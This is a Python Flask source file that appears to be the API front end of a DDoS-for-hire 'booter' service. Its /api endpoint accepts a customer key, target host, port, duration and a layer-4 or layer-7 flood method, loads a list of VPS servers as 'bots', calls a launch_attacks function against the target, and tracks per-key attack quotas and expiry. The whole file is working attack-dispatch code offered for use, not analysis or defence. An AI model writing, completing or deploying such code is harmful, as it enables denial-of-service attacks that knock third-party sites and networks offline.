from flask import * 
import json, datetime
from urllib.parse import urlparse
from funcs.validator import Validation
from funcs.launch_attack import launch_attacks
from funcs.string import str_equals, is_str_empty, sanitize, str_validation

Attack = Blueprint("Attack", __name__)

@Attack.route("/api", methods=["GET"])
@staticmethod
def index_flood():
    if 'key' in request.args and 'host' in request.args and 'port' in request.args and 'time' in request.args and 'method' in request.args:
        key = sanitize(request.args.get('key', default=None, type=str))
        host = sanitize(request.args.get('host', default=None, type=str))
        port = sanitize(request.args.get('port', default=None, type=str))
        time = sanitize(request.args.get('time', default=None, type=str))
        method = sanitize(request.args.get('method', default=None, type=str))
    else:
        return jsonify({"system": "Missing argument(s)."})
    
    if not all([key, host, port, time, method]):
        return jsonify({"system": "Missing argument(s). Null values."})
    
    with open("./data/database.json") as e:
        db = json.load(e)
        
    with open("./data/vps_servers.json") as e:
        bots = json.load(e)
    
    with open("./data/attacks.json") as e:
        dbm = json.load(e)
        
    if str_validation(port):
        return jsonify({"system": "Error, Malcious character detected."})
    
    if str_validation(time):
        return jsonify({"system": "Error, Malcious character detected."})
    
    if str_validation(method):
        return jsonify({"system": "Error, Malicious character detected."})
        
    with open("./data/method.json") as files:
        method_data = json.load(files)
        
    if method.upper() not in method_data['method']['layer4'] and method.upper() not in method_data['method']['layer7'] and method.upper() not in method_data['method']['stop']:
        return jsonify({"system": "Method invalid "})
        
    if method.upper() == "STOP":
        method = method
        
    try:
        launch_attacks(method, host, port, time)
        db["keys"][key]["curCons"] += 1
        with open("./data/database.json", "w") as json_file:
            json.dump(db, json_file, indent=4)
        exp = db["keys"][key]["exp"]
        maxTime = db["keys"][key]["maxTime"]
        maxCons = db["keys"][key]["maxCons"]
        curCons = db["keys"][key]["curCons"]
        return jsonify({'result': {'Successfull Attack to':
        {'host': f'{host}',
        'port': f'{port}',
        'time': f'{time}',
        'method': f'{method}',
        'maxCons': f'{maxCons}',
        'curCons': f'{curCons}',
        'expired': f'{exp}'}}})
    except Exception as e:
        print(e)